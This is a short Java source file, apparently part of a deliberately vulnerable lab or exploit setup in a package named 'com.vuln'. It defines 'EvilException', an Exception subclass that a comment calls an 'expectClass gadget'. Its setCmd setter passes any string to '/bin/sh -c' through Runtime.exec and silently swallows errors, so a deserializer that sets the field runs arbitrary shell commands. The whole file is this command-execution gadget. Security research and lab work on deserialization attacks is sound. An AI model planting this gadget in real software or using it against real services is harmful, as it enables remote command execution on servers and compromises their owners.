package com.vuln;

/** expectClass gadget：Exception 子类，setCmd 执行命令（回传确认用）。 */
public class EvilException extends Exception {
    private String cmd;

    public String getCmd() { return cmd; }
    public void setCmd(String c) {
        this.cmd = c;
        try {
            Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", c});
        } catch (Exception ignored) {
        }
    }
}
